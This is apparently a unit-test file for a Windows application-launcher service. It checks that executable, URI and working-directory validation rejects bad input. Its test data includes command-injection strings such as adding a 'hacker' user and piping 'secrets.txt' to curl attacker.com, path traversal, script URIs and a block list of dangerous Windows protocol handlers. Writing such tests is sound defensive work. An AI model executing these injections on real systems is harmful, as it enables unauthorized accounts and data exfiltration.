namespace WindowsAppManagerMcp.Tests.Unit.Services;

/// <summary>
/// Unit tests for InputValidationService.
/// Tests security validation for executable paths and working directories.
/// Task 7.1 from BACKLOG.md - Input validation for launch_application.
/// </summary>
public class InputValidationServiceTests
{
    private readonly InputValidationService _sut;

    public InputValidationServiceTests()
    {
        // The built-in protocols only, whatever WAM_ALLOWED_PROTOCOLS the test run has
        _sut = new InputValidationService(ProtocolAllowlist.BuiltIn);
    }

    #region ValidateExecutable - Valid Inputs

    [Fact]
    public void ValidateExecutable_SimpleExecutableName_ReturnsValid()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("notepad.exe");

        // Assert
        result.IsValid.Should().BeTrue();
        result.Error.Should().BeNull();
    }

    [Fact]
    public void ValidateExecutable_ExecutableWithoutExtension_ReturnsValid()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("notepad");

        // Assert
        result.IsValid.Should().BeTrue();
        result.Error.Should().BeNull();
    }

    [Fact]
    public void ValidateExecutable_AbsolutePath_ReturnsValid()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(@"C:\Windows\System32\notepad.exe");

        // Assert
        result.IsValid.Should().BeTrue();
        result.Error.Should().BeNull();
        result.SanitizedExecutable.Should().NotBeNull();
    }

    [Theory]
    [InlineData("https://example.com")]
    [InlineData("http://localhost:8080")]
    [InlineData("file:///C:/test.html")]
    [InlineData("mailto:test@example.com")]
    [InlineData("tel:+1234567890")]
    public void ValidateExecutable_SafeProtocol_ReturnsValid(string uri)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeTrue();
        result.Error.Should().BeNull();
    }

    #endregion

    #region ValidateExecutable - Path Traversal

    [Theory]
    [InlineData(@"..\..\malicious.exe")]
    [InlineData(@"C:\..\..\windows\cmd.exe")]
    [InlineData(@".\..\..\test.exe")]
    [InlineData(@"folder\..\..\..\secret.exe")]
    public void ValidateExecutable_PathTraversal_ReturnsInvalid(string path)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(path);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("traversal");
    }

    #endregion

    #region ValidateExecutable - Shell Metacharacters

    [Theory]
    [InlineData("notepad.exe & calc.exe")]
    [InlineData("notepad.exe | calc.exe")]
    [InlineData("notepad.exe; calc.exe")]
    [InlineData("notepad.exe < input.txt")]
    [InlineData("notepad.exe > output.txt")]
    [InlineData("notepad.exe`calc.exe")]
    [InlineData("$(calc.exe)")]
    public void ValidateExecutable_ShellMetacharacters_ReturnsInvalid(string executable)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(executable);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("invalid characters");
    }

    #endregion

    #region ValidateExecutable - Dangerous Protocols

    [Theory]
    [InlineData("ms-windows-store:apps")]
    [InlineData("powershell://command")]
    [InlineData("cmd://command")]
    [InlineData("javascript:alert(1)")]
    [InlineData("vbscript:msgbox")]
    [InlineData("mshta:vbscript:Execute")]
    [InlineData("shell:appsfolder")]
    [InlineData("data:text/html,<script>alert(1)</script>")]
    public void ValidateExecutable_DangerousProtocol_ReturnsInvalid(string uri)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("blocked");
    }

    [Fact]
    public void ValidateExecutable_UnknownProtocol_ReturnsInvalid()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("custom-protocol://something");

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("Unknown protocol").And.Contain(ProtocolAllowlist.Variable);
    }

    #endregion

    #region ValidateExecutable - Settings pages, Store apps and WAM_ALLOWED_PROTOCOLS (roadmap M2.7)

    [Theory]
    [InlineData("ms-settings:")]
    [InlineData("ms-settings:display")]
    [InlineData("MS-SETTINGS:network-wifi")]
    [InlineData(@"shell:AppsFolder\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App")]
    [InlineData(@"shell:appsfolder\Microsoft.WindowsTerminal_8wekyb3d8bbwe!App")]
    [InlineData(@"shell:AppsFolder\Microsoft.Windows.Explorer")]
    [InlineData(@"shell:AppsFolder\MSEdge")]
    public void ValidateExecutable_SettingsPagesAndAppsFolderApps_AreAllowed(string uri)
    {
        // Act
        var result = _sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeTrue(result.Error);
        result.SanitizedExecutable.Should().Be(uri);
    }

    [Theory]
    [InlineData("shell:startup")]
    [InlineData("shell:AppsFolder")]
    [InlineData(@"shell:AppsFolder\")]
    [InlineData(@"shell:AppsFolder\..\..\Windows\System32\cmd.exe")]
    [InlineData(@"shell:AppsFolder\{6D809377-6AF0-444B-8957-A3773F02200E}\Tool\tool.exe")]
    [InlineData(@"shell:AppsFolder\App!Id!Extra")]
    [InlineData(@"shell:AppsFolder\App Id")]
    [InlineData(@"shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}")]
    public void ValidateExecutable_OtherShellLocations_AreBlocked(string uri)
    {
        // Act
        var result = _sut.ValidateExecutable(uri);

        // Assert - only shell:AppsFolder\<AppUserModelID> starts an app; the rest of shell: opens any shell location
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.BlockedProtocol));
        result.Error.Should().Contain(@"shell:AppsFolder\");
    }

    [Theory]
    [InlineData("ms-settings:display\r\ncalc")]
    [InlineData("https://example.com/\npath")]
    [InlineData("https://example.com/\0")]
    public void ValidateExecutable_UriWithControlCharacters_IsInvalidUri(string uri)
    {
        // Act
        var result = _sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidUri));
    }

    /// <summary>
    /// A handler registered as app.exe "%1" (Outlook's mailto: is OUTLOOK.EXE -c IPM.Note /m "%1") would take a raw quote
    /// as the end of its argument, and the rest as more switches; a space or another character a URI cannot hold may split
    /// an unquoted %1.
    /// </summary>
    [Theory]
    [InlineData("mailto:x\" /a \"C:\\secret.txt")]
    [InlineData("mailto:a\"b@example.com")]
    [InlineData("mailto:a@example.com?subject=hello world")]
    [InlineData("tel:+1 234")]
    [InlineData("ms-settings:display|calc")]
    [InlineData("vscode://file/C:/repo/a b.md")]
    [InlineData("vscode://file/C:\\repo\\a.md")]
    [InlineData("vscode://file/<x>")]
    [InlineData("vscode://file/^x")]
    [InlineData("vscode://file/`x`")]
    [InlineData("vscode://file/{x}")]
    [InlineData("https://example.com/\"--foo")]
    public void ValidateExecutable_UriWithAQuoteOrACharacterOutsideUris_IsInvalidUri(string uri)
    {
        // Arrange
        var sut = new InputValidationService(ProtocolAllowlist.Parse("vscode"));

        // Act
        var result = sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidUri));
        result.Error.Should().Contain("Percent-encode");
    }

    [Theory]
    [InlineData("https://example.com/search?q=two words")]
    [InlineData("mailto:a@example.com?subject=hello%20world")]
    [InlineData(@"shell:AppsFolder\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App")]
    public void ValidateExecutable_WebAddressesWithSpacesAndEncodedOrAppsFolderUris_StayValid(string uri)
    {
        // Act
        var result = _sut.ValidateExecutable(uri);

        // Assert - browsers take the whole URI as one argument; shell:AppsFolder has its own strict check
        result.IsValid.Should().BeTrue(result.Error);
    }

    [Theory]
    [InlineData("vscode://file/C:/repo/README.md")]
    [InlineData("ms-teams:l/chat/0/0")]
    [InlineData("SPOTIFY:track:123")]
    [InlineData("ms-windows-store://pdp/?productid=9NBLGGH4NNS1")]
    public void ValidateExecutable_SchemesTheUserAllows_AreAllowed(string uri)
    {
        // Arrange
        var sut = new InputValidationService(ProtocolAllowlist.Parse("vscode, ms-teams:;Spotify ms-windows-store"));

        // Act
        var result = sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeTrue(result.Error);
    }

    [Theory]
    [InlineData("javascript:alert(1)")]
    [InlineData("vbscript:msgbox")]
    [InlineData("data:text/html,x")]
    [InlineData("mshta:x")]
    [InlineData("shell:startup")]
    [InlineData("ms-msdt:/id PCWDiagnostic")]
    [InlineData("search-ms:query=x")]
    [InlineData("ms-appinstaller:?source=https://example.com/x.msix")]
    [InlineData("ms-officecmd:{}")]
    [InlineData("its:C:/x.chm::/a.htm")]
    [InlineData("ms-its:C:/x.chm::/a.htm")]
    [InlineData("mk:@MSITStore:C:/x.chm::/a.htm")]
    [InlineData("hcp://system/x")]
    [InlineData("ms-cxh:x")]
    [InlineData("ms-cxh-full:x")]
    public void ValidateExecutable_BlockedSchemes_StayBlockedWhenTheUserListsThem(string uri)
    {
        // Arrange
        var sut = new InputValidationService(ProtocolAllowlist.Parse(
            "javascript,vbscript,data,mshta,shell,ms-msdt,search-ms,ms-appinstaller,ms-officecmd,its,ms-its,mk,hcp,ms-cxh,ms-cxh-full"));

        // Act
        var result = sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.BlockedProtocol));
    }

    [Fact]
    public void ProtocolAllowlist_Parse_ReportsTheEntriesItIgnores()
    {
        // Act
        var allowlist = ProtocolAllowlist.Parse("vscode, javascript, not_a_scheme, 1abc, file, https, zoommtg:");

        // Assert - a blocked or malformed scheme is ignored, and so is file (always checked as a path); https is built in
        allowlist.ExtraSchemes.Should().BeEquivalentTo("vscode", "zoommtg");
        allowlist.IgnoredEntries.Should().Equal("javascript", "not_a_scheme", "1abc", "file");
    }

    [Fact]
    public void ProtocolAllowlist_FromEnvironment_ReadsTheVariable()
    {
        // Act
        var allowlist = ProtocolAllowlist.FromEnvironment(name => name == ProtocolAllowlist.Variable ? "vscode" : null);
        var unset = ProtocolAllowlist.FromEnvironment(_ => null);

        // Assert
        allowlist.ExtraSchemes.Should().Equal("vscode");
        unset.ExtraSchemes.Should().BeEmpty();
        unset.IgnoredEntries.Should().BeEmpty();
    }

    [Fact]
    public void ValidateExecutable_UnknownProtocol_ListsTheAllowedSchemes()
    {
        // Arrange
        var sut = new InputValidationService(ProtocolAllowlist.Parse("vscode"));

        // Act
        var result = sut.ValidateExecutable("zoommtg://join");

        // Assert
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.UnknownProtocol));
        result.Error.Should().Contain("ms-settings").And.Contain(@"shell:AppsFolder\").And.Contain("vscode");
    }

    #endregion

    #region ValidateExecutable - Interpreters (refused with arguments by the launch, not warned about here)

    [Theory]
    [InlineData("cmd.exe")]
    [InlineData("cmd")]
    [InlineData("powershell.exe")]
    [InlineData("powershell")]
    [InlineData("pwsh.exe")]
    [InlineData("bash.exe")]
    [InlineData("wscript.exe")]
    [InlineData("cscript.exe")]
    [InlineData("mshta.exe")]
    [InlineData("regsvr32.exe")]
    [InlineData("rundll32.exe")]
    public void ValidateExecutable_Interpreter_IsValid_WithoutAWarning(string executable)
    {
        // Arrange & Act - started bare it opens an empty console; with arguments the launch refuses it (roadmap M3.F8)
        var result = _sut.ValidateExecutable(executable);

        // Assert
        result.IsValid.Should().BeTrue();
        result.Warning.Should().BeNull();
    }

    #endregion

    #region ValidateExecutable - Network Paths (Warnings)

    [Fact]
    public void ValidateExecutable_NetworkPath_ReturnsValidWithWarning()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(@"\\server\share\app.exe");

        // Assert
        result.IsValid.Should().BeTrue();
        result.Warning.Should().NotBeNull();
        result.Warning.Should().Contain("network path");
    }

    #endregion

    #region ValidateExecutable - Partial Paths

    // A path with a folder but without a drive and root would be found from the server's own current folder (or drive),
    // which the client does not choose: the same planted-program risk bare names avoid by never searching it
    [Theory]
    [InlineData(@"sub\app.exe")]
    [InlineData("tools/app.exe")]
    [InlineData(@".\app.exe")]
    [InlineData("cmd.exe /c x")]
    [InlineData(@"\server\share\app.exe")]
    [InlineData("/tools/app.exe")]
    [InlineData(@"C:app.exe")]
    [InlineData(@"C:tools\app.exe")]
    public void ValidateExecutable_PartialPath_IsInvalidPath_AndAsksForTheFullPath(string path)
    {
        var result = _sut.ValidateExecutable(path);

        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidPath));
        result.Error.Should().Contain("full path");
    }

    [Theory]
    [InlineData(@"C:\Tools\app.exe")]
    [InlineData(@"\\server\share\app.exe")]
    [InlineData("notepad")]
    [InlineData("notepad.exe")]
    public void ValidateExecutable_FullPathsAndBareNames_StayValid(string path)
    {
        _sut.ValidateExecutable(path).IsValid.Should().BeTrue();
    }

    #endregion

    #region ValidateExecutable - Edge Cases

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void ValidateExecutable_EmptyOrNull_ReturnsInvalid(string? executable)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(executable!);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("empty");
    }

    [Fact]
    public void ValidateExecutable_PathWithSpaces_ReturnsValid()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(@"C:\Program Files\App\application.exe");

        // Assert
        result.IsValid.Should().BeTrue();
    }

    #endregion

    #region ValidateExecutable - Legitimate Absolute Paths (PAL-2 / BRW-2 regressions)

    /// <summary>
    /// Edge's default install location on x64 Windows. launch_browser_with_debug(browser: "edge")
    /// passes this path to launch_application, which rejected it because of the parentheses.
    /// </summary>
    [Fact]
    public void ValidateExecutable_EdgeDefaultX86Path_ReturnsValid()
    {
        // Arrange
        const string edgePath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";

        // Act
        var result = _sut.ValidateExecutable(edgePath);

        // Assert
        result.IsValid.Should().BeTrue();
        result.Error.Should().BeNull();
        result.ErrorCode.Should().BeNull();
        result.SanitizedExecutable.Should().Be(edgePath);
    }

    [Theory]
    [InlineData(@"C:\Program Files (x86)\Steam\steam.exe")]
    [InlineData(@"C:\Users\O'Brien\AppData\Local\Programs\tool\tool.exe")]
    [InlineData(@"C:\R&D\tools\build.exe")]
    [InlineData(@"C:\ProgramData\{0F3A6B2C-1D2E-4F50-9A8B-7C6D5E4F3A2B}\setup.exe")]
    [InlineData(@"C:\Tools; Old\app.exe")]
    [InlineData(@"C:\Money$\app.exe")]
    [InlineData(@"\\server\share\Team (Shared)\app.exe")]
    [InlineData(@"C:/Program Files (x86)/App/app.exe")]
    public void ValidateExecutable_AbsolutePathWithLegitimateSpecialCharacters_ReturnsValid(string path)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(path);

        // Assert
        result.IsValid.Should().BeTrue();
        result.ErrorCode.Should().BeNull();
        result.SanitizedExecutable.Should().Be(Path.GetFullPath(path));
    }

    /// <summary>
    /// Characters that can never appear in a Windows path are still rejected for absolute paths.
    /// </summary>
    [Theory]
    [InlineData("C:\\Program Files\\App\\app.exe\" & calc.exe & \"")]
    [InlineData(@"C:\Program Files\App\app.exe | calc.exe")]
    [InlineData(@"C:\Program Files\App\app.exe > C:\out.txt")]
    [InlineData(@"C:\Program Files\App\app.exe < C:\in.txt")]
    [InlineData(@"C:\Program Files\App\*.exe")]
    [InlineData(@"C:\Program Files\App\app?.exe")]
    [InlineData("C:\\Program Files\\App\\app.exe\r\ncalc.exe")]
    [InlineData("C:\\Program Files\\App\\app\0.exe")]
    public void ValidateExecutable_AbsolutePathWithCharactersInvalidInWindowsPaths_ReturnsInvalid(string path)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(path);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("invalid characters");
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidCharacters));
    }

    #endregion

    #region ValidateExecutable - Error Codes on Every Rejection (PAL-15)

    [Theory]
    [InlineData("javascript:alert(1)")]
    [InlineData("shell:appsfolder")]
    [InlineData("cmd://command")]
    public void ValidateExecutable_DangerousProtocol_ReturnsBlockedProtocolErrorCode(string uri)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.BlockedProtocol));
    }

    [Fact]
    public void ValidateExecutable_UnknownProtocol_ReturnsUnknownProtocolErrorCode()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("custom-protocol://something");

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.UnknownProtocol));
    }

    [Theory]
    [InlineData(@"..\..\malicious.exe")]
    [InlineData(@"C:\..\..\windows\cmd.exe")]
    public void ValidateExecutable_PathTraversal_ReturnsPathTraversalErrorCode(string path)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(path);

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.PathTraversal));
    }

    [Theory]
    [InlineData("notepad.exe & calc.exe")]
    [InlineData("$(calc.exe)")]
    public void ValidateExecutable_BareNameWithShellMetacharacters_ReturnsInvalidCharactersErrorCode(string executable)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(executable);

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidCharacters));
    }

    #endregion

    #region ValidateExecutable - file:// URIs (pro-m7)

    /// <summary>
    /// file:// URIs used to skip every path check. They are now converted to a local path and
    /// validated like any other path, so the launch uses the same rules as a plain path.
    /// </summary>
    [Fact]
    public void ValidateExecutable_FileUri_ReturnsLocalPath()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("file:///C:/Program%20Files%20(x86)/App/readme.html");

        // Assert
        result.IsValid.Should().BeTrue();
        result.SanitizedExecutable.Should().Be(@"C:\Program Files (x86)\App\readme.html");
    }

    [Fact]
    public void ValidateExecutable_FileUriToShell_IsValidatedAsItsPath()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("file:///C:/Windows/System32/cmd.exe");

        // Assert - the launch checks the path for an interpreter (roadmap M3.F8)
        result.IsValid.Should().BeTrue();
        result.SanitizedExecutable.Should().Be(@"C:\Windows\System32\cmd.exe");
        result.Warning.Should().BeNull();
    }

    [Fact]
    public void ValidateExecutable_FileUriToNetworkShare_ReturnsNetworkWarning()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("file://server/share/tool.exe");

        // Assert
        result.IsValid.Should().BeTrue();
        result.SanitizedExecutable.Should().Be(@"\\server\share\tool.exe");
        result.Warning.Should().Contain("network path");
    }

    [Fact]
    public void ValidateExecutable_FileUriWithCharactersInvalidInPaths_ReturnsInvalidCharacters()
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable("file:///C:/a<b.exe");

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidCharacters));
    }

    [Theory]
    [InlineData("file://")]
    [InlineData("file:///")]
    [InlineData("file:a")]
    public void ValidateExecutable_FileUriWithoutLocalPath_ReturnsInvalidUri(string uri)
    {
        // Arrange & Act
        var result = _sut.ValidateExecutable(uri);

        // Assert
        result.IsValid.Should().BeFalse();
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidUri));
    }

    #endregion

    #region ValidateWorkingDirectory - Valid Inputs

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void ValidateWorkingDirectory_NullOrEmpty_ReturnsValid(string? directory)
    {
        // Arrange & Act
        var result = _sut.ValidateWorkingDirectory(directory);

        // Assert
        result.IsValid.Should().BeTrue();
    }

    [Fact]
    public void ValidateWorkingDirectory_AbsolutePath_ReturnsValid()
    {
        // Arrange & Act
        var result = _sut.ValidateWorkingDirectory(@"C:\Windows\System32");

        // Assert
        result.IsValid.Should().BeTrue();
        result.SanitizedPath.Should().NotBeNull();
    }

    #endregion

    #region ValidateWorkingDirectory - Path Traversal

    [Theory]
    [InlineData(@"..\..\secret")]
    [InlineData(@"C:\..\..\etc")]
    public void ValidateWorkingDirectory_PathTraversal_ReturnsInvalid(string directory)
    {
        // Arrange & Act
        var result = _sut.ValidateWorkingDirectory(directory);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("traversal");
    }

    #endregion

    #region ValidateWorkingDirectory - Shell Metacharacters

    [Theory]
    [InlineData(@"C:\folder|pipe")]
    [InlineData(@"C:\folder<in")]
    [InlineData(@"C:\folder>out")]
    [InlineData("C:\\\"quoted\"")]
    [InlineData("C:\\folder\nnext")]
    [InlineData(@"folder & other")]
    [InlineData(@"relative\dir;calc")]
    public void ValidateWorkingDirectory_ShellMetacharacters_ReturnsInvalid(string directory)
    {
        // Arrange & Act
        var result = _sut.ValidateWorkingDirectory(directory);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("invalid characters");
        result.ErrorCode.Should().Be(nameof(LaunchErrorCode.InvalidWorkingDirectory));
    }

    /// <summary>
    /// Regression (PAL-2): absolute directories may legitimately contain parentheses, ampersands,
    /// apostrophes and braces. ShellExecute never passes the working directory through a shell.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Program Files (x86)\Microsoft\Edge\Application")]
    [InlineData(@"C:\folder & other")]
    [InlineData(@"C:\Users\O'Brien\Documents")]
    [InlineData(@"C:\R&D\{0F3A6B2C-1D2E-4F50-9A8B-7C6D5E4F3A2B}")]
    [InlineData(@"\\server\share\Team (Shared)")]
    public void ValidateWorkingDirectory_AbsolutePathWithLegitimateSpecialCharacters_ReturnsValid(string directory)
    {
        // Arrange & Act
        var result = _sut.ValidateWorkingDirectory(directory);

        // Assert
        result.IsValid.Should().BeTrue();
        result.ErrorCode.Should().BeNull();
        result.SanitizedPath.Should().Be(Path.GetFullPath(directory));
    }

    #endregion

    #region ValidateWorkingDirectory - Network Paths (Warnings)

    [Fact]
    public void ValidateWorkingDirectory_NetworkPath_ReturnsValidWithWarning()
    {
        // Arrange & Act
        var result = _sut.ValidateWorkingDirectory(@"\\server\share\folder");

        // Assert
        result.IsValid.Should().BeTrue();
        result.Warning.Should().NotBeNull();
        result.Warning.Should().Contain("network");
    }

    #endregion

    #region Integration-style Tests

    [Fact]
    public void ValidateExecutable_RealWorldSafeExample_NotepadPath()
    {
        // Arrange - Test with actual Windows path
        var notepadPath = @"C:\Windows\System32\notepad.exe";

        // Act
        var result = _sut.ValidateExecutable(notepadPath);

        // Assert
        result.IsValid.Should().BeTrue();
        result.Error.Should().BeNull();
        result.Warning.Should().BeNull();
    }

    [Fact]
    public void ValidateExecutable_RealWorldAttack_CommandChaining()
    {
        // Arrange - Common command injection pattern
        var malicious = "notepad.exe && net user hacker password /add";

        // Act
        var result = _sut.ValidateExecutable(malicious);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Error.Should().Contain("invalid characters");
    }

    [Fact]
    public void ValidateExecutable_RealWorldAttack_PipeToMalware()
    {
        // Arrange - Pipe injection pattern
        var malicious = "type secrets.txt | curl attacker.com";

        // Act
        var result = _sut.ValidateExecutable(malicious);

        // Assert
        result.IsValid.Should().BeFalse();
    }

    #endregion

    [Theory]
    [InlineData("Microsoft.WindowsCalculator_8wekyb3d8bbwe!App")]
    [InlineData("  MSTeams_8wekyb3d8bbwe!MSTeams ")]
    public void ValidateExecutable_ABarePackagedAppId_IsAllowedUnchanged(string executable)
    {
        // Roadmap M6.5: the launch activates it; nothing is resolved on disk
        var result = new InputValidationService(ProtocolAllowlist.BuiltIn).ValidateExecutable(executable);

        result.IsValid.Should().BeTrue();
        result.SanitizedExecutable.Should().Be(executable.Trim());
    }
}
